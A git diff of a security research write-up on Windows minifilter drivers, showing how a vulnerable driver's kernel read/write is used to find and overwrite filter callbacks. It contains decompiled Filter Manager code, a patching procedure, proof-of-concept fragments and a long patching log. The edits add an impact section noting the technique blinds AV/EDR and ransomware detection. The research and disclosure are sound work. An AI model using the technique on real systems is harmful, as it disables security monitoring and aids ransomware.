@@ -1,6 +1,6 @@
 ## 0.0 - Intro
 ### 0.1 Abstract
-This research project served to help me learn more about file system minifilter drivers and how a malicious actor may leverage a vulnerable driver to patch callbacks for minifilters. In my research, I'd discovered previous research by Aviad Shamriz which helped me immensely in my endeavor.
+This research project served to help me learn more about file system minifilter drivers and how a malicious actor may leverage a vulnerable driver to patch callbacks for minifilters. In my research, I discovered previous research by Aviad Shamriz which helped me immensely in my endeavor.
 
 https://aviadshamriz.medium.com/part-1-fs-minifilter-hooking-7e743b042a9d
 
@@ -164,7 +164,7 @@ kd> dt FLTMGR!_FLT_REGISTRATION
 ```
 
 #### FLT_OPERATION_REGISTRATION
-The `FLT_OPERATION_REGISTRATION` structure defines the I/O request Major Function to filter, and defines a pre and post-operation callback which will be invoked, respectively, before or after the I/O operation is passed down to / back up from the I/O stack.
+The `FLT_OPERATION_REGISTRATION` structure defines the I/O request Major Function to filter, and defines a pre and post-operation callback which will be invoked before or after the I/O operation is passed down to / back up from the I/O stack respectively.
 ```
 typedef struct _FLT_OPERATION_REGISTRATION {
 
@@ -583,7 +583,7 @@ The filter manager is responsible for the conversion of `FLT_REGISTRATION_OPERAT
 ### 1.2 - Writing a minifilter
 To aid in research and testing, I created a very simple mini filter driver to get the PID of any given process which inevitably invokes the `IRP_MJ_CREATE` operation on the file `C:\Users\<USER>\test.txt`, and log it via `DbgPrint`.
 
-```
+```C++
 #include <fltKernel.h>
 #include <ntddk.h>
 
@@ -669,7 +669,7 @@ NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT pDrvObj, _In_ PUNICODE_STRING pRegPath)
 ```
 (Fig 4) DemoMinifilter.c
 
-### 1.3 Debugging (god help me)
+### 1.3 Debugging
 Now that we have a prerequisite understanding of some of the functions and APIs used, let's dig further in towards our goal of silencing callbacks by debugging the filter.
 
 I cannot assert that this is a sane approach to debugging. YMMV.
@@ -708,9 +708,9 @@ Spoiler alert: No.
 
 After patching those through a routine in my driver that just replaced all the ones I saw in the `PFLT_FILTER` I got from `FltRegisterFilter`, I saw that they were still being invoked so I knew my job was not yet done.
 
-I decided to go aaaaaaaall the way back to `FltRegisterFilter` to examine any routines I thought might be doing anything "important" with the filter. Viewing `FltStartFiltering` in IDA shows the process of filter initialization.
+I decided to go aaaaaaaall the way back to `FltRegisterFilter` to examine any routines I thought might be doing anything "important" with the filter. Viewing `FltStartFiltering` in IDA shows the process of filter initialization:
 
-```
+```C++
 NTSTATUS __stdcall FltStartFiltering(PFLT_FILTER Filter)
 {
   int v2; // ebx
@@ -755,7 +755,7 @@ kd> dt FLTMGR!_FLT_FILTER_FLAGS
 
 Otherwise, `FltStartFiltering` calls `FltpDoVolumeNotificationForNewFilter`, which in turn calls `FltpEnumerateRegistryInstances`. 
 
-```
+```C++
 __int64 __fastcall FltpDoVolumeNotificationForNewFilter(_FLT_FILTER *lpFilter)
 {
   _FLTP_FRAME *Frame; // rbx
@@ -808,7 +808,7 @@ __int64 __fastcall FltpDoVolumeNotificationForNewFilter(_FLT_FILTER *lpFilter)
 
 After loads of debugging and staring at IDA I found a chain of function calls stemming from `FltStartFiltering` that led me to an api called `FltpSetCallbacksForInstance` which looked like a pretty good candidate for the function responsible for... you know... setting the callbacks for a `_FLT_INSTANCE`.  I'd found the first three functions in the call-chain in FltMgr correctly, but something was missing... So I set a breakpoint on  `FltpSetCallbacksForInstance` and reloaded my minifilter.
 
-```
+```C++
 __int64 __fastcall FltpSetCallbacksForInstance(
         _FLT_INSTANCE *lpFilterInstance,
         __int64 lpCallbackNode,
@@ -949,7 +949,7 @@ Using the ***PHENOMENAL*** Windbg plugin, ret-sync (https://github.com/bootleg/r
 
 Once the first argument type was found, I discovered that the second argument `rdx` was simply offset `0x238` from our `_FLT_INSTANCE`. Continuing debugging, I traced execution to `FltpInitializeCallbackNode`, and corrected the argument types in IDA to give the following decompilation:
 
-```
+```C++
 __int64 __fastcall FltpInitializeCallbackNode(
         _CALLBACK_NODE *lpCallbackNode,
         _FLT_OPERATION_REGISTRATION *lpFilterOperations,
@@ -1137,7 +1137,7 @@ ffffcb0e`0bc69ae8  ffffcb0e`0bc698a0 fffff805`109eb4b0
 
 With ALL of that out of the way, I then had a decent understanding of what I had to do to overwrite the callbacks I was testing.:
 
-1. Somehow find the frame
+1. Find the target frame describing the minifilter
 2. Find all the volumes in the frame
 3. For every volume in the frame, find the `_CALLBACK_CTRL` object
 4. Inside every `_CALLBACK_CTRL` object, index into it's list of  `_CALLBACK_NODE` lists with `MajorFunction+22` as the index
@@ -1356,7 +1356,7 @@ I wanted to focus my time on getting this PoC working, and I came across this re
 
 Because I want to make this PoC as extensible as possible, I created a simple base class providing a `VirtualRead` and `VirtualWrite` method.
 
-```
+```C++
 class MemHandler
 {
 public:
@@ -1370,7 +1370,7 @@ MemHandler.h
 
 The FltUtil class is designed to be constructed with any class extending the `MemHandler` class, allowing anyone to reuse this code with a different driver / library, so long as you implement your own `MemHandler`.
 
-```
+```C++
 // source truncated
 
 typedef struct _HANDY_FUNCTIONS {
@@ -1535,7 +1535,7 @@ Returns TRUE if all patching was successful, FALSE if one or many patches failed
 This example code uses the dbutil_2_3.sys driver for virtual read/write, and will replace all callbacks for the argument-supplied filter.
 
 
-```
+```C++
 #include <Windows.h>
 #include "memory.h"
 #include "FltUtil.h"
@@ -1715,489 +1715,7 @@ Found 7 attached volumes for frame FFFFE287B70BD6A0
         MajFn - 22
         ListEntryPtr - ffffe287b767b290
 
-==== Volume: \Device\HarddiskVolume1 ====
-        MajFn - 22
-        ListEntryPtr - ffffe287b95222d0
-        Pre Callback is at : ffffe287b989ecf0   val fffff80535fbf9b0
-                ** PATCHED!
-        Post Callback is at : ffffe287b989ecf0  val fffff80535fc0320
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolumeShadowCopy1 ====
-        MajFn - 22
-        ListEntryPtr - ffffe287be53f960
-        Pre Callback is at : ffffe287bea1aaf0   val fffff80535fbf9b0
-                ** PATCHED!
-        Post Callback is at : ffffe287bea1aaf0  val fffff80535fc0320
-                ** PATCHED
-
-==== Volume: \Device\Mup ====
-        MajFn - 25
-        ListEntryPtr - ffffe287b734ba00
-        Pre Callback is at : ffffe287bea2fd20   val fffff80535ff00a0
-                ** PATCHED!
-        Post Callback is at : ffffe287bea2fd20  val fffff80535f45e00
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolume4 ====
-        MajFn - 25
-        ListEntryPtr - ffffe287b7475730
-        Pre Callback is at : ffffe287bd3d6d20   val fffff80535ff00a0
-                ** PATCHED!
-        Post Callback is at : ffffe287bd3d6d20  val fffff80535f45e00
-                ** PATCHED
-
-==== Volume: \Device\NamedPipe ====
-        MajFn - 25
-        ListEntryPtr - ffffe287b767a6b0
-        Pre Callback is at : ffffe287bd3d5d20   val fffff80535ff00a0
-                ** PATCHED!
-        Post Callback is at : ffffe287bd3d5d20  val fffff80535f45e00
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolume2 ====
-        MajFn - 25
-        ListEntryPtr - ffffe287b708d2c0
-        Pre Callback is at : ffffe287b93e6d20   val fffff80535ff00a0
-                ** PATCHED!
-        Post Callback is at : ffffe287b93e6d20  val fffff80535f45e00
-                ** PATCHED
-
-==== Volume: \Device\Mailslot ====
-        MajFn - 25
-        ListEntryPtr - ffffe287b767b2c0
-
-==== Volume: \Device\HarddiskVolume1 ====
-        MajFn - 25
-        ListEntryPtr - ffffe287b9522300
-        Pre Callback is at : ffffe287b989ed20   val fffff80535ff00a0
-                ** PATCHED!
-        Post Callback is at : ffffe287b989ed20  val fffff80535f45e00
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolumeShadowCopy1 ====
-        MajFn - 25
-        ListEntryPtr - ffffe287be53f990
-        Pre Callback is at : ffffe287bea1ab20   val fffff80535ff00a0
-                ** PATCHED!
-        Post Callback is at : ffffe287bea1ab20  val fffff80535f45e00
-                ** PATCHED
-
-==== Volume: \Device\Mup ====
-        MajFn - 26
-        ListEntryPtr - ffffe287b734ba10
-        Pre Callback is at : ffffe287bea2fd50   val fffff80535f46aa0
-                ** PATCHED!
-        Post Callback is at : ffffe287bea2fd50  val fffff80535f47100
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolume4 ====
-        MajFn - 26
-        ListEntryPtr - ffffe287b7475740
-        Pre Callback is at : ffffe287bd3d6d50   val fffff80535f46aa0
-                ** PATCHED!
-        Post Callback is at : ffffe287bd3d6d50  val fffff80535f47100
-                ** PATCHED
-
-==== Volume: \Device\NamedPipe ====
-        MajFn - 26
-        ListEntryPtr - ffffe287b767a6c0
-        Pre Callback is at : ffffe287bd3d5d50   val fffff80535f46aa0
-                ** PATCHED!
-        Post Callback is at : ffffe287bd3d5d50  val fffff80535f47100
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolume2 ====
-        MajFn - 26
-        ListEntryPtr - ffffe287b708d2d0
-        Pre Callback is at : ffffe287b93e6d50   val fffff80535f46aa0
-                ** PATCHED!
-        Post Callback is at : ffffe287b93e6d50  val fffff80535f47100
-                ** PATCHED
-
-==== Volume: \Device\Mailslot ====
-        MajFn - 26
-        ListEntryPtr - ffffe287b767b2d0
-
-==== Volume: \Device\HarddiskVolume1 ====
-        MajFn - 26
-        ListEntryPtr - ffffe287b9522310
-        Pre Callback is at : ffffe287b989ed50   val fffff80535f46aa0
-                ** PATCHED!
-        Post Callback is at : ffffe287b989ed50  val fffff80535f47100
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolumeShadowCopy1 ====
-        MajFn - 26
-        ListEntryPtr - ffffe287be53f9a0
-        Pre Callback is at : ffffe287bea1ab50   val fffff80535f46aa0
-                ** PATCHED!
-        Post Callback is at : ffffe287bea1ab50  val fffff80535f47100
-                ** PATCHED
-
-==== Volume: \Device\Mup ====
-        MajFn - 28
-        ListEntryPtr - ffffe287b734ba30
-        Pre Callback is at : ffffe287bea2fd80   val fffff80535ff0720
-                ** PATCHED!
-        Post Callback is at : ffffe287bea2fd80  val fffff80535f48750
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolume4 ====
-        MajFn - 28
-        ListEntryPtr - ffffe287b7475760
-        Pre Callback is at : ffffe287bd3d6d80   val fffff80535ff0720
-                ** PATCHED!
-        Post Callback is at : ffffe287bd3d6d80  val fffff80535f48750
-                ** PATCHED
-
-==== Volume: \Device\NamedPipe ====
-        MajFn - 28
-        ListEntryPtr - ffffe287b767a6e0
-        Pre Callback is at : ffffe287bd3d5d80   val fffff80535ff0720
-                ** PATCHED!
-        Post Callback is at : ffffe287bd3d5d80  val fffff80535f48750
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolume2 ====
-        MajFn - 28
-        ListEntryPtr - ffffe287b708d2f0
-        Pre Callback is at : ffffe287b93e6d80   val fffff80535ff0720
-                ** PATCHED!
-        Post Callback is at : ffffe287b93e6d80  val fffff80535f48750
-                ** PATCHED
-
-==== Volume: \Device\Mailslot ====
-        MajFn - 28
-        ListEntryPtr - ffffe287b767b2f0
-
-==== Volume: \Device\HarddiskVolume1 ====
-        MajFn - 28
-        ListEntryPtr - ffffe287b9522330
-        Pre Callback is at : ffffe287b989ed80   val fffff80535ff0720
-                ** PATCHED!
-        Post Callback is at : ffffe287b989ed80  val fffff80535f48750
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolumeShadowCopy1 ====
-        MajFn - 28
-        ListEntryPtr - ffffe287be53f9c0
-        Pre Callback is at : ffffe287bea1ab80   val fffff80535ff0720
-                ** PATCHED!
-        Post Callback is at : ffffe287bea1ab80  val fffff80535f48750
-                ** PATCHED
-
-==== Volume: \Device\Mup ====
-        MajFn - 40
-        ListEntryPtr - ffffe287b734baf0
-        Pre Callback is at : ffffe287bea2fdb0   val fffff80535fc1a30
-                ** PATCHED!
-        Post Callback is at : ffffe287bea2fdb0  val fffff80535f357a0
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolume4 ====
-        MajFn - 40
-        ListEntryPtr - ffffe287b7475820
-        Pre Callback is at : ffffe287bd3d6db0   val fffff80535fc1a30
-                ** PATCHED!
-        Post Callback is at : ffffe287bd3d6db0  val fffff80535f357a0
-                ** PATCHED
-
-==== Volume: \Device\NamedPipe ====
-        MajFn - 40
-        ListEntryPtr - ffffe287b767a7a0
-        Pre Callback is at : ffffe287bd3d5db0   val fffff80535fc1a30
-                ** PATCHED!
-        Post Callback is at : ffffe287bd3d5db0  val fffff80535f357a0
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolume2 ====
-        MajFn - 40
-        ListEntryPtr - ffffe287b708d3b0
-        Pre Callback is at : ffffe287b93e6db0   val fffff80535fc1a30
-                ** PATCHED!
-        Post Callback is at : ffffe287b93e6db0  val fffff80535f357a0
-                ** PATCHED
-
-==== Volume: \Device\Mailslot ====
-        MajFn - 40
-        ListEntryPtr - ffffe287b767b3b0
-
-==== Volume: \Device\HarddiskVolume1 ====
-        MajFn - 40
-        ListEntryPtr - ffffe287b95223f0
-        Pre Callback is at : ffffe287b989edb0   val fffff80535fc1a30
-                ** PATCHED!
-        Post Callback is at : ffffe287b989edb0  val fffff80535f357a0
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolumeShadowCopy1 ====
-        MajFn - 40
-        ListEntryPtr - ffffe287be53fa80
-        Pre Callback is at : ffffe287bea1abb0   val fffff80535fc1a30
-                ** PATCHED!
-        Post Callback is at : ffffe287bea1abb0  val fffff80535f357a0
-                ** PATCHED
-
-==== Volume: \Device\Mup ====
-        MajFn - 21
-        ListEntryPtr - ffffe287b734b9c0
-        Pre Callback is at : ffffe287bea2fde0   val fffff80535ff0640
-                ** PATCHED!
-        Post Callback is at : ffffe287bea2fde0  val fffff80535f47870
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolume4 ====
-        MajFn - 21
-        ListEntryPtr - ffffe287b74756f0
-        Pre Callback is at : ffffe287bd3d6de0   val fffff80535ff0640
-                ** PATCHED!
-        Post Callback is at : ffffe287bd3d6de0  val fffff80535f47870
-                ** PATCHED
-
-==== Volume: \Device\NamedPipe ====
-        MajFn - 21
-        ListEntryPtr - ffffe287b767a670
-        Pre Callback is at : ffffe287bd3d5de0   val fffff80535ff0640
-                ** PATCHED!
-        Post Callback is at : ffffe287bd3d5de0  val fffff80535f47870
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolume2 ====
-        MajFn - 21
-        ListEntryPtr - ffffe287b708d280
-        Pre Callback is at : ffffe287b93e6de0   val fffff80535ff0640
-                ** PATCHED!
-        Post Callback is at : ffffe287b93e6de0  val fffff80535f47870
-                ** PATCHED
-
-==== Volume: \Device\Mailslot ====
-        MajFn - 21
-        ListEntryPtr - ffffe287b767b280
-
-==== Volume: \Device\HarddiskVolume1 ====
-        MajFn - 21
-        ListEntryPtr - ffffe287b95222c0
-        Pre Callback is at : ffffe287b989ede0   val fffff80535ff0640
-                ** PATCHED!
-        Post Callback is at : ffffe287b989ede0  val fffff80535f47870
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolumeShadowCopy1 ====
-        MajFn - 21
-        ListEntryPtr - ffffe287be53f950
-        Pre Callback is at : ffffe287bea1abe0   val fffff80535ff0640
-                ** PATCHED!
-        Post Callback is at : ffffe287bea1abe0  val fffff80535f47870
-                ** PATCHED
-
-==== Volume: \Device\Mup ====
-        MajFn - 38
-        ListEntryPtr - ffffe287b734bad0
-        Pre Callback is at : ffffe287bea2fe10   val fffff80535fc22c0
-                ** PATCHED!
-
-==== Volume: \Device\HarddiskVolume4 ====
-        MajFn - 38
-        ListEntryPtr - ffffe287b7475800
-        Pre Callback is at : ffffe287bd3d6e10   val fffff80535fc22c0
-                ** PATCHED!
-
-==== Volume: \Device\NamedPipe ====
-        MajFn - 38
-        ListEntryPtr - ffffe287b767a780
-        Pre Callback is at : ffffe287bd3d5e10   val fffff80535fc22c0
-                ** PATCHED!
-
-==== Volume: \Device\HarddiskVolume2 ====
-        MajFn - 38
-        ListEntryPtr - ffffe287b708d390
-        Pre Callback is at : ffffe287b93e6e10   val fffff80535fc22c0
-                ** PATCHED!
-
-==== Volume: \Device\Mailslot ====
-        MajFn - 38
-        ListEntryPtr - ffffe287b767b390
-
-==== Volume: \Device\HarddiskVolume1 ====
-        MajFn - 38
-        ListEntryPtr - ffffe287b95223d0
-        Pre Callback is at : ffffe287b989ee10   val fffff80535fc22c0
-                ** PATCHED!
-
-==== Volume: \Device\HarddiskVolumeShadowCopy1 ====
-        MajFn - 38
-        ListEntryPtr - ffffe287be53fa60
-        Pre Callback is at : ffffe287bea1ac10   val fffff80535fc22c0
-                ** PATCHED!
-
-==== Volume: \Device\Mup ====
-        MajFn - 36
-        ListEntryPtr - ffffe287b734bab0
-        Pre Callback is at : ffffe287bea2fe40   val fffff80535fc1980
-                ** PATCHED!
-        Post Callback is at : ffffe287bea2fe40  val fffff80535f356a0
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolume4 ====
-        MajFn - 36
-        ListEntryPtr - ffffe287b74757e0
-        Pre Callback is at : ffffe287bd3d6e40   val fffff80535fc1980
-                ** PATCHED!
-        Post Callback is at : ffffe287bd3d6e40  val fffff80535f356a0
-                ** PATCHED
-
-==== Volume: \Device\NamedPipe ====
-        MajFn - 36
-        ListEntryPtr - ffffe287b767a760
-        Pre Callback is at : ffffe287bd3d5e40   val fffff80535fc1980
-                ** PATCHED!
-        Post Callback is at : ffffe287bd3d5e40  val fffff80535f356a0
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolume2 ====
-        MajFn - 36
-        ListEntryPtr - ffffe287b708d370
-        Pre Callback is at : ffffe287b93e6e40   val fffff80535fc1980
-                ** PATCHED!
-        Post Callback is at : ffffe287b93e6e40  val fffff80535f356a0
-                ** PATCHED
-
-==== Volume: \Device\Mailslot ====
-        MajFn - 36
-        ListEntryPtr - ffffe287b767b370
-
-==== Volume: \Device\HarddiskVolume1 ====
-        MajFn - 36
-        ListEntryPtr - ffffe287b95223b0
-        Pre Callback is at : ffffe287b989ee40   val fffff80535fc1980
-                ** PATCHED!
-        Post Callback is at : ffffe287b989ee40  val fffff80535f356a0
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolumeShadowCopy1 ====
-        MajFn - 36
-        ListEntryPtr - ffffe287be53fa40
-        Pre Callback is at : ffffe287bea1ac40   val fffff80535fc1980
-                ** PATCHED!
-        Post Callback is at : ffffe287bea1ac40  val fffff80535f356a0
-                ** PATCHED
-
-==== Volume: \Device\Mup ====
-        MajFn - 35
-        ListEntryPtr - ffffe287b734baa0
-        Pre Callback is at : ffffe287bea2fe70   val fffff80535fc3490
-                ** PATCHED!
-        Post Callback is at : ffffe287bea2fe70  val fffff80535f35f40
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolume4 ====
-        MajFn - 35
-        ListEntryPtr - ffffe287b74757d0
-        Pre Callback is at : ffffe287bd3d6e70   val fffff80535fc3490
-                ** PATCHED!
-        Post Callback is at : ffffe287bd3d6e70  val fffff80535f35f40
-                ** PATCHED
-
-==== Volume: \Device\NamedPipe ====
-        MajFn - 35
-        ListEntryPtr - ffffe287b767a750
-        Pre Callback is at : ffffe287bd3d5e70   val fffff80535fc3490
-                ** PATCHED!
-        Post Callback is at : ffffe287bd3d5e70  val fffff80535f35f40
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolume2 ====
-        MajFn - 35
-        ListEntryPtr - ffffe287b708d360
-        Pre Callback is at : ffffe287b93e6e70   val fffff80535fc3490
-                ** PATCHED!
-        Post Callback is at : ffffe287b93e6e70  val fffff80535f35f40
-                ** PATCHED
-
-==== Volume: \Device\Mailslot ====
-        MajFn - 35
-        ListEntryPtr - ffffe287b767b360
-
-==== Volume: \Device\HarddiskVolume1 ====
-        MajFn - 35
-        ListEntryPtr - ffffe287b95223a0
-        Pre Callback is at : ffffe287b989ee70   val fffff80535fc3490
-                ** PATCHED!
-        Post Callback is at : ffffe287b989ee70  val fffff80535f35f40
-                ** PATCHED
-
-==== Volume: \Device\HarddiskVolumeShadowCopy1 ====
-        MajFn - 35
-        ListEntryPtr - ffffe287be53fa30
-        Pre Callback is at : ffffe287bea1ac70   val fffff80535fc3490
-                ** PATCHED!
-        Post Callback is at : ffffe287bea1ac70  val fffff80535f35f40
-                ** PATCHED
-
-==== Volume: \Device\Mup ====
-        MajFn - 23
-        ListEntryPtr - ffffe287b734b9e0
-        Pre Callback is at : ffffe287bea2fea0   val fffff80535fc1360
-                ** PATCHED!
-
-==== Volume: \Device\HarddiskVolume4 ====
-        MajFn - 23
-        ListEntryPtr - ffffe287b7475710
-        Pre Callback is at : ffffe287bd3d6ea0   val fffff80535fc1360
-                ** PATCHED!
-
-==== Volume: \Device\NamedPipe ====
-        MajFn - 23
-        ListEntryPtr - ffffe287b767a690
-        Pre Callback is at : ffffe287bd3d5ea0   val fffff80535fc1360
-                ** PATCHED!
-
-==== Volume: \Device\HarddiskVolume2 ====
-        MajFn - 23
-        ListEntryPtr - ffffe287b708d2a0
-        Pre Callback is at : ffffe287b93e6ea0   val fffff80535fc1360
-                ** PATCHED!
-
-==== Volume: \Device\Mailslot ====
-        MajFn - 23
-        ListEntryPtr - ffffe287b767b2a0
-
-==== Volume: \Device\HarddiskVolume1 ====
-        MajFn - 23
-        ListEntryPtr - ffffe287b95222e0
-        Pre Callback is at : ffffe287b989eea0   val fffff80535fc1360
-                ** PATCHED!
-
-==== Volume: \Device\HarddiskVolumeShadowCopy1 ====
-        MajFn - 23
-        ListEntryPtr - ffffe287be53f970
-        Pre Callback is at : ffffe287bea1aca0   val fffff80535fc1360
-                ** PATCHED!
-
-==== Volume: \Device\Mup ====
-        MajFn - 8
-        ListEntryPtr - ffffe287b734b8f0
-        Pre Callback is at : ffffe287bea2fed0   val fffff80535fc1910
-                ** PATCHED!
-
-==== Volume: \Device\HarddiskVolume4 ====
-        MajFn - 8
-        ListEntryPtr - ffffe287b7475620
-        Pre Callback is at : ffffe287bd3d6ed0   val fffff80535fc1910
-                ** PATCHED!
-
-==== Volume: \Device\NamedPipe ====
-        MajFn - 8
-        ListEntryPtr - ffffe287b767a5a0
-        Pre Callback is at : ffffe287bd3d5ed0   val fffff80535fc1910
-                ** PATCHED!
-
-==== Volume: \Device\HarddiskVolume2 ====
-        MajFn - 8
-        ListEntryPtr - ffffe287b708d1b0
-        Pre Callback is at : ffffe287b93e6ed0   val fffff80535fc1910
-                ** PATCHED!
+< TRUNCATED >
 
 ==== Volume: \Device\Mailslot ====
         MajFn - 8
@@ -2217,10 +1735,36 @@ Found 7 attached volumes for frame FFFFE287B70BD6A0
 Patched 114 callbacks
 ```
 
-The full code may be found at `<GITHUB REPO HERE>`.
+The full code may be found at https://github.com/alfarom256/MCP-PoC
+
+#### 2.4 Impact
+
+The elimination of pre and post operation callbacks removes introspective abilities by AV/EDR/Backup utilities against monitored volume(s). In practical terms, this technique may be used by malicious actors to prevent minifilter based detection and prevention of ransomware or other filesystem manipulation.
 
 ## 3.0 Outro
 
 Thank you to all the amazing people contributing to research in this area, without whom this project would not be possible. I'm sure there are things I could do better in this PoC, so please feel free to let me know.
 
 Huge thanks to the vx community for the chance to publish this work, and thank you to my friends and mentors I have had the pleasure of working with over the past few years.
+
+```
+@@@@@@@@@@@@@@@@@@PYYB@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@Y    B@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@&J!!Y@@@@@@@@@@@@@@@@@@
+@@@@@@@@#&@@@@@#GP5YY5PB&@@@@@&#&@@@@@@@
+@@@@&P7: :#@#J~.        .~5&@B. :7P&@@@@
+@@#J:  .75#?.   .~7??7^.   :Y&5!.  :?#@@
+@J.  ~5&@#^   :Y&&BGB#@#J.   7@@&Y^  .?&
+!  ^G@@@@7   ^&@Y.    ~B@G.   5@@@@P:  ~
+.  J@@@@@:   Y@G       ^@@~   !@@@@@7   
+P.  !G@@@~   !@@!     .5@&:   J@@@P~  .5
+@#?.  ^Y#P    7B@BY?JP&@G^   ^#GJ^  .7#@
+@@@&Y^   ^P^    ~Y#@@G?^    !5:   :J#@@@
+G?7J&@B5JY@@5~.   :&G    .7G@&Y?YB&P7!J&
+.   7@@@@@@@@@#7   #5   Y&@@@@@@@@G    Y
+BJ7Y#@@@@@@@@@@Y  .#P   B@@@@@@@@@@P??5@
+@@@@@@@@B?7Y@@@Y  :&G   B@@&J7J#@@@@@@@@
+@@@@@@@@Y   7P5:  ^@B   ~P5^   P@@@@@@@@
+@@@@@@@@@Y:     .!B@@P~      ^P@@@@@@@@@
+@@@@@@@@@@&G5YYP#@@@@@@B5YY5G@@@@@@@@@@@
+```
